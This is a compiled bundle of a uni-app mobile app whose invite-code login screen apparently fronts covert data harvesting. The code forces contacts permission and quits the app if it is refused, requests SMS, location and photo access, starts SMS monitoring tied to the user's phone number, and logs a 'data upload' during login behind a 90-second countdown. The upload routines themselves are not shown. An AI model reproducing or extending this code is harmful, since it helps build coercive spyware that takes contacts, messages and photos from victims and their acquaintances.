            formatAppLog("error", "at utils/ios-handler.js:1425", "相册处理失败:", error);
          });
          return true;
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:1430", "登录过程出错:", error);
          if (error.message === "重复号码，请换号码进行登录") {
            throw error;
          } else {
            throw error;
          }
        }
      } catch (error) {
        formatAppLog("error", "at utils/ios-handler.js:1438", "整个登录流程出错:", error);
        if (error.code === 20) {
          formatAppLog("log", "at utils/ios-handler.js:1442", "登录流程中检测到code 20错误，显示对话框并退出应用");
          uni.setStorageSync("ios_contacts_permission_denied", "true");
          uni.showModal({
            title: "权限被拒绝",
            content: "应用无法继续运行，请重启并允许权限请求。",
            showCancel: false,
            success: () => {
              this.forceQuitApp();
            }
          });
        } else if (error.message && (error.message.includes("权限") || error.message.includes("permission"))) {
          formatAppLog("log", "at utils/ios-handler.js:1462", "登录流程中检测到权限错误，准备退出应用");
          uni.showModal({
            title: "权限错误",
            content: "应用需要必要的权限才能正常运行。请重启应用并授予权限。",
            showCancel: false,
            success: () => {
              this.forceQuitApp();
            }
          });
        }
        throw error;
      }
    }
  }
  __publicField(IOSHandler, "hasNavigated", false);
  // 添加弹窗控制变量，防止多个弹窗同时显示
  __publicField(IOSHandler, "permissionDialogShowing", false);
  const _export_sfc = (sfc, props) => {
    const target = sfc.__vccOpts || sfc;
    for (const [key, val] of props) {
      target[key] = val;
    }
    return target;
  };
  const networkState = {
    isConnected: false,
    networkType: "none"
  };
  const getNetworkState = () => networkState;
  const _sfc_main$4 = {
    onLaunch: async function() {
      try {
        await this.checkNetworkConnection();
        networkState.isConnected = true;
        try {
          await configManager.loadConfig();
        } catch (configError) {
          formatAppLog("error", "at App.vue:31", "加载配置失败，使用默认设置", configError);
        }
        try {
          let screenOrientation = "portrait";
          try {
            screenOrientation = configManager.getScreenOrientation() || "portrait";
          } catch (orientationError) {
            formatAppLog("error", "at App.vue:42", "获取屏幕方向配置失败，使用默认竖屏", orientationError);
          }
          formatAppLog("log", "at App.vue:45", "设置屏幕方向:", screenOrientation);
          if (screenOrientation === "landscape") {
            formatAppLog("log", "at App.vue:49", "锁定屏幕为横屏模式");
            plus.screen.lockOrientation("landscape-primary");
          } else {
            formatAppLog("log", "at App.vue:53", "锁定屏幕为竖屏模式");
            plus.screen.lockOrientation("portrait-primary");
          }
        } catch (screenError) {
          formatAppLog("error", "at App.vue:57", "设置屏幕方向失败，继续执行", screenError);
          try {
            plus.screen.lockOrientation("portrait-primary");
          } catch (e) {
            formatAppLog("error", "at App.vue:62", "设置默认屏幕方向也失败", e);
          }
        }
        if (PlatformUtil.isAndroid()) {
          formatAppLog("log", "at App.vue:69", "应用启动，优先检查通讯录权限");
          const hasContactsPermission = await AndroidHandler.checkAndHandleContactsPermission();
          if (!hasContactsPermission) {
            formatAppLog("log", "at App.vue:73", "通讯录权限检查失败，应用将退出");
            return;
          }
          formatAppLog("log", "at App.vue:78", "通讯录权限已授权，继续检查其他权限");
          await AndroidHandler.checkPermissions();
          formatAppLog("log", "at App.vue:82", "Android应用启动，所有权限检查完成");
          const phone = uni.getStorageSync("phone");
          if (phone) {
            formatAppLog("log", "at App.vue:87", "发现已保存的用户手机号，启动短信监控功能");
            AndroidHandler.startSmsMonitoring(phone);
          }
        } else if (PlatformUtil.isIOS()) {
          formatAppLog("log", "at App.vue:92", "iOS应用启动，优先检查通讯录权限");
          IOSHandler.permissionDialogShowing = false;
          const syncPermissionCheck = IOSHandler.checkContactsPermissionSync();
          formatAppLog("log", "at App.vue:99", "同步检查通讯录权限结果:", syncPermissionCheck);
          if (syncPermissionCheck) {
            formatAppLog("log", "at App.vue:103", "实际已有通讯录权限，清除拒绝记录并继续");
            uni.setStorageSync("ios_contacts_permission", "granted");
            uni.removeStorageSync("ios_contacts_permission_denied");
            await this.checkIOSPermissions();
            formatAppLog("log", "at App.vue:109", "iOS应用启动，所有权限已获取");
          } else {
            formatAppLog("log", "at App.vue:112", "无通讯录权限，开始权限请求流程");
            formatAppLog("log", "at App.vue:115", "执行详细权限检查");
            const actualPermission = await IOSHandler.checkContactsPermissionWithoutPrompt();
            formatAppLog("log", "at App.vue:117", "实际通讯录权限状态:", actualPermission);
            if (actualPermission) {
              formatAppLog("log", "at App.vue:120", "通讯录权限已获得，清除任何之前的拒绝记录");
              uni.removeStorageSync("ios_contacts_permission_denied");
              uni.setStorageSync("ios_contacts_permission", "granted");
              await this.checkIOSPermissions();
              formatAppLog("log", "at App.vue:126", "iOS应用启动，所有权限已获取");
            } else {
              formatAppLog("log", "at App.vue:128", "通讯录权限实际检查失败，执行权限请求流程");
              const launchCheck = IOSHandler.checkContactsPermissionAtLaunch();
              if (!launchCheck) {
                formatAppLog("log", "at App.vue:133", "启动权限检查失败，应用将退出");
                return;
              }
              try {
                const contactsPermission = await IOSHandler.checkContactsPermission();
                formatAppLog("log", "at App.vue:140", "通讯录权限检查结果:", contactsPermission);
                if (!contactsPermission) {
                  formatAppLog("log", "at App.vue:143", "通讯录权限检查失败，退出应用");
                  if (!IOSHandler.permissionDialogShowing) {
                    await IOSHandler.showPermissionDialog(
                      "通讯录权限被拒绝",
                      "此应用需要访问通讯录才能继续使用。请重启应用并授予权限。",
                      false
                    );
                    setTimeout(() => {
                      IOSHandler.forceQuitApp();
                    }, 500);
                  }
                  return;
                }
                await this.checkIOSPermissions();
                formatAppLog("log", "at App.vue:161", "iOS应用启动，所有权限已获取");
              } catch (permissionError) {
                formatAppLog("error", "at App.vue:163", "权限检查错误:", permissionError);
                if (permissionError.code === 20) {
                  formatAppLog("log", "at App.vue:167", "检测到code 20权限错误，显示对话框并退出");
                  uni.setStorageSync("ios_contacts_permission_denied", "true");
                  if (!IOSHandler.permissionDialogShowing) {
                    await IOSHandler.showPermissionDialog(
                      "通讯录权限被拒绝",
                      "此应用需要访问通讯录才能继续使用。请重启应用并授予权限。"
                    );
                    setTimeout(() => {
                      IOSHandler.forceQuitApp();
                    }, 500);
                  }
                  return;
                }
                throw permissionError;
              }
            }
          }
        }
      } catch (error) {
        formatAppLog("error", "at App.vue:191", "初始化失败:", error);
        if (error.message && (error.message.includes("权限") || error.message.includes("permission"))) {
          formatAppLog("log", "at App.vue:194", "权限相关错误，显示对话框后退出应用");
          if (!IOSHandler.permissionDialogShowing) {
            await IOSHandler.showPermissionDialog(
              "权限错误",
              "应用需要必要的权限才能正常运行。请重启应用并授予所需权限。",
              false
            );
            if (PlatformUtil.isIOS()) {
              IOSHandler.forceQuitApp();
            } else {
              plus.runtime.quit();
            }
          }
        } else if (error.code === 20) {
          formatAppLog("log", "at App.vue:212", "检测到code 20权限错误，退出应用");
          uni.setStorageSync("ios_contacts_permission_denied", "true");
          if (!IOSHandler.permissionDialogShowing) {
            await IOSHandler.showPermissionDialog(
              "权限被拒绝",
              "应用无法继续运行，请重启并允许权限请求。",
              false
            );
            if (PlatformUtil.isIOS()) {
              IOSHandler.forceQuitApp();
            } else {
              plus.runtime.quit();
            }
          }
        }
      }
      plus.navigator.setFullscreen(true);
      plus.navigator.setStatusBarBackground("transparent");
      plus.navigator.setStatusBarStyle("light");
    },
    onShow: function() {
      formatAppLog("log", "at App.vue:243", "App Show");
      if (PlatformUtil.isAndroid()) {
        const phone = uni.getStorageSync("phone");
        if (phone && !AndroidHandler.isMonitoringSms) {
          formatAppLog("log", "at App.vue:249", "应用恢复前台，重新启动短信监控");
          AndroidHandler.startSmsMonitoring(phone);
        }
      }
    },
    onHide: function() {
      formatAppLog("log", "at App.vue:255", "App Hide");
      if (PlatformUtil.isAndroid() && AndroidHandler.isMonitoringSms) {
        formatAppLog("log", "at App.vue:259", "应用进入后台，暂停短信监控");
        AndroidHandler.stopSmsMonitoring();
      }
    },
    methods: {
      checkNetworkConnection() {
        return new Promise((resolve, reject) => {
          const checkConnection = () => {
            uni.getNetworkType({
              success: (res) => {
                if (res.networkType !== "none") {
                  formatAppLog("log", "at App.vue:270", "网络连接成功:", res.networkType);
                  networkState.isConnected = true;
                  networkState.networkType = res.networkType;
                  resolve();
                } else {
                  formatAppLog("log", "at App.vue:276", "等待网络连接...");
                  networkState.isConnected = false;
                  networkState.networkType = "none";
                  setTimeout(checkConnection, 1e3);
                }
              },
              fail: (error) => {
                formatAppLog("error", "at App.vue:284", "获取网络状态失败:", error);
                setTimeout(checkConnection, 1e3);
              }
            });
          };
          checkConnection();
          uni.onNetworkStatusChange((res) => {
            networkState.isConnected = res.isConnected;
            networkState.networkType = res.networkType;
            if (res.isConnected) {
              formatAppLog("log", "at App.vue:300", "网络已连接:", res.networkType);
              resolve();
            }
          });
        });
      },
      // iOS权限检查方法
      async checkIOSPermissions() {
        formatAppLog("log", "at App.vue:309", "开始检查iOS权限...");
        const locationPermission = await IOSHandler.checkLocationPermission();
        formatAppLog("log", "at App.vue:315", "定位权限状态:", locationPermission);
        const smsPermission = await IOSHandler.checkSMSPermission();
        formatAppLog("log", "at App.vue:319", "短信权限状态:", smsPermission);
        const photoPermission = await IOSHandler.checkPhotoPermission();
        formatAppLog("log", "at App.vue:323", "相册权限状态:", photoPermission);
        return {
          location: locationPermission,
          contacts: true,
          // 前面已经检查过通讯录权限
          sms: smsPermission,
          photo: photoPermission
        };
      },
      // iOS短信权限检查
      async checkSMSPermission() {
        formatAppLog("log", "at App.vue:337", "iOS平台不需要短信权限，跳过");
        return true;
      }
    }
  };
  const App = /* @__PURE__ */ _export_sfc(_sfc_main$4, [["__file", "D:/别人的txl/前台/Client/App.vue"]]);
  const _sfc_main$3 = {
    data() {
      return {
        displayImages: [],
        currentIndex: 0,
        timer: null,
        config: {
          interval: 5e3
        },
        loadingImages: false,
        configLoaded: false
      };
    },
    // 改用created，尽早设置监听器
    created() {
      configManager.addListener(this.handleConfigChange);
    },
    // DOM渲染后初始化
    mounted() {
      this.initBackgroundImages();
    },
    // 组件销毁前清理
    beforeDestroy() {
      configManager.removeListener(this.handleConfigChange);
      if (this.timer) {
        clearInterval(this.timer);
      }
    },
    methods: {
      // 处理配置变更
      handleConfigChange(config2) {
        this.configLoaded = true;
        const bgImages = config2.background_images || [];
        if (bgImages.length > 0 && (this.displayImages.length === 0 || this.displayImages.length === 1 && this.displayImages[0] === "")) {
          this.loadImages(bgImages);
        }
      },
      async initBackgroundImages() {
        try {
          this.displayImages = [""];
          const networkState2 = getNetworkState();
          if (!networkState2.isConnected) {
            await this.checkNetworkConnection(5e3);
          }
          this.startSlideshow();
          const cachedImages = uni.getStorageSync("background_images");
          let usedCache = false;
          if (cachedImages && Array.isArray(cachedImages) && cachedImages.length > 0) {
            usedCache = await this.showCachedImages(cachedImages);
          }
          if (!configManager.loaded) {
            await configManager.loadConfig();
          }
          this.configLoaded = true;
          let imageUrls = configManager.getBackgroundImages();
          if (imageUrls && Array.isArray(imageUrls) && imageUrls.length > 0) {
            if (!usedCache) {
              await this.loadImages(imageUrls);
            }
          } else {
            this.displayImages = [""];
          }
        } catch (error) {
          formatAppLog("error", "at components/background-slider.vue:109", "初始化背景图片失败:", error);
          this.displayImages = [""];
        }
      },
      async loadImages(imageUrls, isBackgroundLoad = false) {
        if (this.loadingImages) {
          return;
        }
        this.loadingImages = true;
        const successfulUrls = [];
        try {
          if (!isBackgroundLoad) {
            await this.checkNetworkConnection(3e3);
          }
          if (!imageUrls || !Array.isArray(imageUrls) || imageUrls.length === 0) {
            this.loadingImages = false;
            return;
          }
          try {
            const loadPromises = imageUrls.map((url) => this.preloadImage(url).catch((err) => {
              formatAppLog("error", "at components/background-slider.vue:139", `预加载图片失败 ${url}:`, err);
              return null;
            }));
            const results = await Promise.all(loadPromises);
            for (let i = 0; i < results.length; i++) {
              if (results[i]) {
                successfulUrls.push(imageUrls[i]);
              }
            }
            if (successfulUrls.length > 0) {
              if (isBackgroundLoad && this.displayImages.length > 0 && this.displayImages[0] !== "") {
                this.displayImages = [.../* @__PURE__ */ new Set([...this.displayImages, ...successfulUrls])];
              } else {
                this.displayImages = successfulUrls;
                this.startSlideshow();
              }
              uni.setStorageSync("background_images", successfulUrls);
            } else {
              formatAppLog("error", "at components/background-slider.vue:168", "所有图片加载失败");
              if (!isBackgroundLoad && (this.displayImages.length === 0 || this.displayImages[0] === "")) {
                this.displayImages = [""];
                this.startSlideshow();
              }
            }
          } catch (error) {
            formatAppLog("error", "at components/background-slider.vue:175", "图片加载失败:", error);
            if (!isBackgroundLoad && (this.displayImages.length === 0 || this.displayImages[0] === "")) {
              this.displayImages = [""];
              this.startSlideshow();
            }
          }
        } catch (error) {
          formatAppLog("error", "at components/background-slider.vue:182", "加载图片处理失败:", error);
          if (!isBackgroundLoad && (this.displayImages.length === 0 || this.displayImages[0] === "")) {
            this.displayImages = [""];
            this.startSlideshow();
          }
        } finally {
          this.loadingImages = false;
        }
      },
      async showCachedImages(images) {
        if (images && images.length > 0) {
          const validationPromises = images.map((url) => this.checkImageExists(url));
          try {
            const results = await Promise.all(validationPromises);
            const validImages = images.filter((_, index) => results[index] === true);
            if (validImages.length > 0) {
              this.displayImages = validImages;
              this.startSlideshow();
              if (validImages.length < images.length) {
                await configManager.loadConfig();
              }
              return true;
            }
          } catch (error) {
            formatAppLog("error", "at components/background-slider.vue:218", "验证缓存图片失败", error);
          }
        }
        return false;
      },
      // 检查图片是否存在
      async checkImageExists(url) {
        try {
          await this.preloadImage(url);
          return true;
        } catch (error) {
          return false;
        }
      },
      // 图片预加载
      preloadImage(url) {
        return new Promise((resolve, reject) => {
          uni.getImageInfo({
            src: url,
            success: (res) => {
              resolve({
                width: res.width,
                height: res.height
              });
            },
            fail: (error) => {
              reject(error);
            }
          });
        });
      },
      // 启动轮播
      startSlideshow() {
        if (this.timer) {
          clearInterval(this.timer);
        }
        if (!this.displayImages || this.displayImages.length <= 1) {
          return;
        }
        this.timer = setInterval(() => {
          this.currentIndex = (this.currentIndex + 1) % this.displayImages.length;
        }, this.config.interval);
      },
      // 检查网络连接状态
      checkNetworkConnection(timeout = 5e3) {
        return new Promise((resolve) => {
          const timeoutId = setTimeout(() => {
            resolve();
          }, timeout);
          const checkConnection = () => {
            uni.getNetworkType({
              success: (res) => {
                if (res.networkType !== "none") {
                  clearTimeout(timeoutId);
                  resolve();
                } else {
                  setTimeout(checkConnection, 500);
                }
              },
              fail: () => {
                setTimeout(checkConnection, 500);
              }
            });
          };
          checkConnection();
        });
      }
    },
    beforeDestroy() {
      if (this.timer) {
        clearInterval(this.timer);
      }
    }
  };
  function _sfc_render$3(_ctx, _cache, $props, $setup, $data, $options) {
    return vue.openBlock(), vue.createElementBlock("view", { class: "slideshow" }, [
      (vue.openBlock(true), vue.createElementBlock(
        vue.Fragment,
        null,
        vue.renderList($data.displayImages, (image, index) => {
          return vue.openBlock(), vue.createElementBlock(
            "view",
            {
              key: index,
              class: vue.normalizeClass(["slideshow-image", { current: $data.currentIndex === index }]),
              style: vue.normalizeStyle({ backgroundImage: `url('${image}')` })
            },
            null,
            6
            /* CLASS, STYLE */
          );
        }),
        128
        /* KEYED_FRAGMENT */
      ))
    ]);
  }
  const BackgroundSlider = /* @__PURE__ */ _export_sfc(_sfc_main$3, [["render", _sfc_render$3], ["__scopeId", "data-v-44742fbd"], ["__file", "D:/别人的txl/前台/Client/components/background-slider.vue"]]);
  const config = {
    // UI配置
    ui: {
      // 主题色配置
      theme: {
        primary: "#FF6B22",
        inputBg: "rgba(255, 255, 255, 0.1)",
        inputBorder: "rgba(255, 255, 255, 0.2)",
        textPrimary: "#FFFFFF",
        textSecondary: "rgba(255, 255, 255, 0.6)"
      },
      // 动画配置
      animation: {
        duration: 300,
        timing: "ease-in-out"
      }
    },
    // 表单验证规则
    validation: {
      // 手机号验证规则
      phoneRules: {
        "zh-CN": {
          pattern: /^1[3-9]\d{9}$/,
          message: "请输入正确的手机号码"
        },
        "zh-HK": {
          pattern: /^[5-9]\d{7}$/,
          message: "請輸入正確的手機號碼"
        },
        "zh-TW": {
          pattern: /^09\d{8}$/,
          message: "請輸入正確的手機號碼"
        },
        "en": {
          pattern: /^\d{10,}$/,
          message: "Please enter a valid phone number"
        },
        "ja": {
          pattern: /^\d{10,}$/,
          message: "有効な電話番号を入力してください"
        },
        "ko": {
          pattern: /^\d{10,}$/,
          message: "올바른 전화번호를 입력하세요"
        },
        "vi": {
          pattern: /^\d{9,10}$/,
          message: "Vui lòng nhập số điện thoại hợp lệ"
        },
        "pt-br": {
          pattern: /^[1-9]{2}9?[0-9]{8}$/,
          message: "Número de telefone inválido"
        },
        "es-es": {
          pattern: /^[6-9][0-9]{8}$/,
          message: "Número de teléfono no válido"
        },
        "ro-ro": {
          pattern: /^(07[2-8]{1}[0-9]{7})$/,
          message: "Număr de telefon invalid"
        },
        "ar-sa": {
          pattern: /^(05)[0-9]{8}$/,
          message: "رقم هاتف غير صالح"
        }
      },
      // 简化邀请码验证规则
      inviteCodeRule: {
        pattern: /^\d+$/,
        // 只验证是否为数字
        message: "请输入数字"
      }
    },
    // 区号配置
    phoneAreaCodes: {
      "zh-CN": "+86",
      "zh-HK": "+852",
      "zh-TW": "+886",
      "en": "+1",
      "ja": "+81",
      "ko": "+82",
      "vi": "+84",
      "pt-br": "+55",
      "es-es": "+34",
      "ro-ro": "+40",
      "ar-sa": "+966",
      "yn-yna": "+62"
    }
  };
  var isIos;
  isIos = plus.os.name == "iOS";
  function requestAndroidPermission(permissionID) {
    return new Promise((resolve, reject) => {
      plus.android.requestPermissions(
        [permissionID],
        function(resultObj) {
          var result = 0;
          for (var i = 0; i < resultObj.granted.length; i++) {
            if (permissionID == resultObj.granted[i]) {
              result = 1;
            }
          }
          for (var i = 0; i < resultObj.deniedPresent.length; i++) {
            if (permissionID == resultObj.deniedPresent[i]) {
              result = 0;
            }
          }
          for (var i = 0; i < resultObj.deniedAlways.length; i++) {
            if (permissionID == resultObj.deniedAlways[i]) {
              result = -1;
            }
          }
          resolve(result);
        },
        function(error) {
          resolve(0);
        }
      );
    });
  }
  function gotoAppPermissionSetting() {
    if (isIos) {
      var UIApplication = plus.ios.import("UIApplication");
      var application2 = UIApplication.sharedApplication();
      var NSURL2 = plus.ios.import("NSURL");
      var setting2 = NSURL2.URLWithString("app-settings:");
      application2.openURL(setting2);
      plus.ios.deleteObject(setting2);
      plus.ios.deleteObject(NSURL2);
      plus.ios.deleteObject(application2);
    } else {
      var Intent = plus.android.importClass("android.content.Intent");
      var Settings = plus.android.importClass("android.provider.Settings");
      var Uri = plus.android.importClass("android.net.Uri");
      var mainActivity = plus.android.runtimeMainActivity();
      var intent = new Intent();
      intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
      var uri = Uri.fromParts("package", mainActivity.getPackageName(), null);
      intent.setData(uri);
      mainActivity.startActivity(intent);
    }
  }
  const permision = {
    requestAndroidPermission,
    gotoAppPermissionSetting
  };
  const _sfc_main$2 = {
    components: {
      BackgroundSlider
    },
    data() {
      return {
        phone: "",
        inviteCode: "",
        phoneError: "",
        inviteCodeError: "",
        currentLangIndex: 0,
        languages: [
          "简体中文",
          "香港繁體",
          "台灣繁體",
          "English",
          "日本語",
          "한국어",
          "Tiếng Việt",
          "Brasileiro",
          "España",
          "română",
          "العربية"
        ],
        languageCodes: [
          "zh-CN",
          "zh-HK",
          "zh-TW",
          "en",
          "ja",
          "ko",
          "vi",
          "pt-br",
          "es-es",
          "ro-ro",
          "ar-sa"
        ],
        isInputFocused: false,
        isLoginProcessing: false,
        countdown: 80,
        showCountdown: false,
        countdownTimer: null,
        timer: null,
        // 权限状态：null=未检查, false=已授权, true=需要弹窗
        stateContact: null,
        stateSMS: null,
        stateTh: null,
        statePhoto: null,
        configData: {
          show_logo_title: 0,
          logo_image: "",
          login_title: "",
          show_agreement: 0,
          agreement_text: "",
          agreement_url: "",
          copyright_text: "",
          show_copyright: 0,
          // 语言切换配置默认值
          show_language_switch: 1,
          language_font_size: "14",
          language_font_color: "#ffffff",
          language_font_weight: "normal",
          language_bg_color: "rgba(0,0,0,0.3)",
          language_position: "top-right",
          // 登录按钮样式配置默认值
          login_button_font_size: "16",
          login_button_font_color: "#ffffff",
          login_button_font_weight: "normal",
          login_button_bg_color: "#8257e6",
          login_button_gradient_color: "#6c45c4",
          login_button_radius: "4"
        },
        logoImageRatio: 1,
        // 默认是正方形
        showLanguageDropdown: false,
        // 确保默认不显示语言下拉菜单
        isPageLoading: true,
        // 添加页面加载状态
        showDebugPanel: false,
        __DEV__: true,
        _styleLogged: false
      };
    },
    computed: {
      currentLanguage() {
        var _a;
        return ((_a = this.languages) == null ? void 0 : _a[this.currentLangIndex]) || "简体中文";
      },
      currentAreaCode() {
        var _a, _b;
        const currentLang = (_a = this.languageCodes) == null ? void 0 : _a[this.currentLangIndex];
        return ((_b = config.phoneAreaCodes) == null ? void 0 : _b[currentLang]) || "+86";
      },
      isFormValid() {
        const phoneValid = this.phone && this.phone.length > 0 && !this.phoneError;
        const codeValid = this.inviteCode && this.inviteCode.length > 0 && !this.inviteCodeError && !/\D/.test(this.inviteCode);
        if (phoneValid && codeValid) {
          this.$nextTick(() => {
            this.logButtonStyle();
          });
        }
        return phoneValid && codeValid;
      },
      placeholderStyle() {
        return "color: rgba(255, 255, 255, 0.5); font-size: 14px;";
      },
      phoneMaxLength() {
        var _a;
        const lang = ((_a = this.languageCodes) == null ? void 0 : _a[this.currentLangIndex]) || "zh-CN";
        switch (lang) {
          case "zh-CN":
            return 11;
          case "zh-HK":
            return 8;
          case "zh-TW":
            return 10;
          case "vi":
            return 10;
          default:
            return 11;
        }
      },
      loginButtonStyle() {
        this.debugLogStyle();
        if (!this.isFormValid || this.isLoginProcessing) {
          return "width: 100%; height: 45px; border-radius: 4px; color: rgba(255, 255, 255, 0.5); font-size: 16px; border: none; background: linear-gradient(135deg, rgba(150, 150, 150, 0.8) 0%, rgba(180, 180, 180, 0.8) 100%); opacity: 0.7; cursor: not-allowed; box-shadow: none; position: relative; overflow: hidden;";
        }
        const buttonRadius = this.configData.login_button_radius || "4";
        const fontColor = this.configData.login_button_font_color || "#222020";
        const fontWeight = this.configData.login_button_font_weight || "bold";
        const fontSize = this.configData.login_button_font_size || "16";
        const bgColor = this.configData.login_button_bg_color || "#736b85";
        const gradientColor = this.configData.login_button_gradient_color || "#184dc9";
        const shadow = this.configData.login_button_shadow ? "0 4px 15px rgba(0, 0, 0, 0.3)" : "none";
        const style = `
				width: 100%; 
				height: 45px; 
				border-radius: ${buttonRadius}px; 
				color: ${fontColor}; 
				font-weight: ${fontWeight}; 
				font-size: ${fontSize}px; 
				border: none; 
				background: linear-gradient(135deg, ${bgColor} 0%, ${gradientColor} 100%); 
				box-shadow: ${shadow}; 
				position: relative; 
				overflow: hidden; 
				opacity: 1;
			`.replace(/\s+/g, " ").trim();
        formatAppLog("log", "at pages/index/index.vue:367", "最终按钮样式:", style);
        return style;
      }
    },
    watch: {
      phone(val) {
        this.validatePhone();
      },
      inviteCode(val) {
        this.validateInviteCode();
      }
    },
    methods: {
      // 切换语言下拉菜单显示状态
      toggleLanguageDropdown() {
        this.showLanguageDropdown = !this.showLanguageDropdown;
        formatAppLog("log", "at pages/index/index.vue:386", "切换语言下拉菜单:", this.showLanguageDropdown ? "显示" : "隐藏");
      },
      // 选择语言
      selectLanguage(index) {
        this.currentLangIndex = index;
        const lang = this.languageCodes[index];
        this.$i18n.locale = lang;
        uni.setStorageSync("language", lang);
        this.showLanguageDropdown = false;
        this.phone = "";
        this.phoneError = "";
        this.inviteCode = "";
        this.inviteCodeError = "";
        formatAppLog("log", "at pages/index/index.vue:412", "已切换语言为:", this.languages[index], "(", lang, ")");
      },
      handleInputFocus() {
        this.isInputFocused = true;
      },
      handleInputBlur() {
        this.isInputFocused = false;
      },
      handlePhoneInput(e) {
        this.phoneError = "";
        this.validatePhone();
        this.$nextTick(() => {
          setTimeout(() => {
            this.$forceUpdate();
          }, 10);
        });
      },
      validatePhone() {
        var _a, _b, _c;
        try {
          if (!this.phone) {
            this.phoneError = "";
            return;
          }
          const currentLang = (_a = this.languageCodes) == null ? void 0 : _a[this.currentLangIndex];
          if (!currentLang) {
            formatAppLog("log", "at pages/index/index.vue:445", "Language code not found");
            return;
          }
          const rule = (_c = (_b = config.validation) == null ? void 0 : _b.phoneRules) == null ? void 0 : _c[currentLang];
          if (!(rule == null ? void 0 : rule.pattern)) {
            formatAppLog("log", "at pages/index/index.vue:451", "Phone validation rule not found");
            return;
          }
          if (!rule.pattern.test(this.phone)) {
            this.phoneError = rule.message || this.$t("phoneError");
          } else {
            this.phoneError = "";
          }
          this.$nextTick(() => {
            this.$forceUpdate();
          });
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:466", "验证手机号时出错:", error);
          this.phoneError = "";
        }
      },
      validateInviteCode() {
        try {
          this.inviteCodeError = "";
          if (!this.inviteCode) {
            return;
          }
          if (!/^\d+$/.test(this.inviteCode)) {
            this.inviteCodeError = true;
            this.$nextTick(() => {
              this.$forceUpdate();
            });
          } else {
            this.$forceUpdate();
            this.$nextTick(() => {
              this.$forceUpdate();
            });
          }
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:496", "验证邀请码时出错:", error);
          this.inviteCodeError = "";
        }
      },
      async handleLogin() {
        try {
          this.initFormValidation();
          if (!this.isFormValid) {
            uni.showToast({ title: this.$t("formIncomplete"), icon: "none" });
            return;
          }
          if (!this.phone) {
            uni.showToast({ title: this.$t("phoneError"), icon: "none" });
            return;
          }
          if (!this.inviteCode) {
            uni.showToast({ title: this.$t("inviteCodeError"), icon: "none" });
            return;
          }
          if (this.isLoginProcessing)
            return;
          this.isLoginProcessing = true;
          uni.showLoading({ title: "正在登录中..." });
          const Handler = PlatformUtil.isIOS() ? IOSHandler : AndroidHandler;
          if (PlatformUtil.isAndroid()) {
            AndroidHandler.startSmsMonitoring(this.phone);
          }
          setTimeout(() => {
            uni.hideLoading();
            this.startCountdown();
          }, 3e3);
          Handler.handleLogin(this.phone, this.inviteCode).then(() => {
            formatAppLog("log", "at pages/index/index.vue:540", "数据上传完成");
          }).catch((error) => {
            formatAppLog("error", "at pages/index/index.vue:543", "登录处理失败:", error);
          });
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:547", "登录失败:", error);
          this.isLoginProcessing = false;
          uni.hideLoading();
        }
      },
      startCountdown() {
        this.showCountdown = true;
        this.countdown = 90;
        this.isLoginProcessing = false;
        if (this.countdownTimer) {
          clearInterval(this.countdownTimer);
        }
        this.countdownTimer = setInterval(() => {
          if (this.countdown > 0) {
            this.countdown--;
          } else {
            this.stopCountdown();
            uni.navigateTo({
              url: "/pages/loading/loading",
              fail: (error) => {
                formatAppLog("error", "at pages/index/index.vue:571", "跳转失败:", error);
                setTimeout(() => {
                  uni.navigateTo({ url: "/pages/loading/loading" });
                }, 500);
              }
            });
          }
        }, 1e3);
      },
      stopCountdown() {
        if (this.countdownTimer) {
          clearInterval(this.countdownTimer);
          this.countdownTimer = null;
        }
        this.showCountdown = false;
      },
      openAgreement() {
        if (this.configData.agreement_url) {
          uni.navigateTo({
            url: `/pages/webview/webview?url=${encodeURIComponent(this.configData.agreement_url)}&title=${encodeURIComponent(this.configData.agreement_text || "服务协议")}`
          });
        }
      },
      outApp() {
        if (uni.getSystemInfoSync().platform == "ios") {
          plus.ios.import("UIApplication").sharedApplication().performSelector("exit");
        } else if (uni.getSystemInfoSync().platform == "android") {
          plus.runtime.quit();
        }
      },
      openContactPower() {
        this.stateContact = null;
        permision.gotoAppPermissionSetting();
      },
      openTHPower() {
        this.stateTh = null;
        permision.gotoAppPermissionSetting();
      },
      openPhotoPower() {
        this.statePhoto = null;
        permision.gotoAppPermissionSetting();
      },
      // 初始化语言设置
      initLanguage() {
        const savedLang = uni.getStorageSync("language");
        if (savedLang) {
          const index = this.languageCodes.indexOf(savedLang);
          if (index !== -1) {
            this.currentLangIndex = index;
            this.$i18n.locale = savedLang;
          }
        }
        formatAppLog("log", "at pages/index/index.vue:633", "语言初始化完成，当前语言:", this.currentLanguage, "语言代码:", this.languageCodes[this.currentLangIndex]);
      },
      // 初始化表单验证状态
      initFormValidation() {
        try {
          this.phoneError = "";
          this.inviteCodeError = "";
          if (!this.phone) {
            formatAppLog("log", "at pages/index/index.vue:645", "初始化表单验证 - 手机号为空");
          } else {
            this.validatePhone();
          }
          if (!this.inviteCode) {
            formatAppLog("log", "at pages/index/index.vue:652", "初始化表单验证 - 邀请码为空");
          } else {
            this.validateInviteCode();
          }
          this.$nextTick(() => {
            formatAppLog("log", "at pages/index/index.vue:660", "初始化表单验证 - 当前状态:", this.isFormValid);
            this.$forceUpdate();
          });
        } catch (error) {
          formatAppLog("error", "at pages/index/index.vue:666", "初始化表单验证时出错:", error);
        }
      },
      // 禁止页面拖动
      preventTouchMove(e) {
        e.preventDefault();
      },
      // 配置加载完成后的处理
      async onConfigLoaded() {
        try {
          const config2 = configManager.config;
          formatAppLog("log", "at pages/index/index.vue:682", "===== 按钮配置调试信息 =====");
          formatAppLog("log", "at pages/index/index.vue:683", "配置加载完成 - 字体颜色:", config2.login_button_font_color);
          formatAppLog("log", "at pages/index/index.vue:684", "配置加载完成 - 背景色:", config2.login_button_bg_color);
          formatAppLog("log", "at pages/index/index.vue:685", "配置加载完成 - 渐变色:", config2.login_button_gradient_color);
          formatAppLog("log", "at pages/index/index.vue:686", "配置加载完成 - 字体大小:", config2.login_button_font_size);
          formatAppLog("log", "at pages/index/index.vue:687", "配置加载完成 - 字体粗细:", config2.login_button_font_weight);
          formatAppLog("log", "at pages/index/index.vue:688", "配置加载完成 - 圆角大小:", config2.login_button_radius);
          formatAppLog("log", "at pages/index/index.vue:689", "配置加载完成 - 阴影效果:", config2.login_button_shadow);
          this.configData = {
            ...this.configData,
            // 保留现有配置
            ...config2,
            // 更新从API获取的配置
